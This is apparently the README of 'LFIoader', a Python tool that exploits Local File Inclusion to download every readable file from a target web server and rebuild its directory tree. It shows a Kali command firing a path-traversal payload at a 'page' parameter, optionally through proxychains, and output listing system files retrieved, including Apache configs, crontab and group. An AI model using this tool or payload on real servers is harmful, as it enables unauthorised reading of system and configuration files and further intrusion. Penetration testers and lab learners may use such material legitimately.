# LFIoader

Enumerates readable files via Local File Inclusion and mimics the directory structure of the system beeing read. 

```bash
root@kali:/tmp# (proxychains -q) python LFIoader.py -u 'http://10.10.10.10/nav.php?page=../../../../../../../../../../../'
[Succcess][/boot/grub/grub.cfg]
[Succcess][/etc/adduser.conf]
[Succcess][/etc/apache2/apache2.conf]
[Succcess][/etc/apache2/envvars]
[Succcess][/etc/apache2/mods-available/autoindex.conf]
[Succcess][/etc/apache2/mods-available/deflate.conf]
[Succcess][/etc/apache2/mods-available/dir.conf]
[...]
``` 

```bash
root@kali:/tmp/10.10.10.10-1660157015.3783913# tree
.
├── boot
│   └── grub
│       └── grub.cfg
├── etc
│   ├── adduser.conf
│   ├── apache2
│   │   ├── apache2.conf
│   │   ├── envvars
[...]
│   │   └── ports.conf
│   ├── avahi
│   │   └── avahi-daemon.conf
│   ├── bash.bashrc
│   ├── bluetooth
│   │   ├── input.conf
│   │   ├── main.conf
│   │   └── network.conf
│   ├── ca-certificates.conf
│   ├── ca-certificates.conf.dpkg-old
│   ├── crontab
│   ├── cups
│   │   └── cupsd.conf
│   ├── debconf.conf
│   ├── debian_version
│   ├── default
│   │   └── grub
│   ├── deluser.conf
│   ├── dhcp
│   │   └── dhclient.conf
│   ├── fstab
│   ├── fuse.conf
│   ├── group
[...]
│   │   ├── stat
│   │   └── status
│   └── version
├── usr
│   └── share
│       └── adduser
│           └── adduser.conf
└── var
    └── log
        └── Xorg.0.log
```
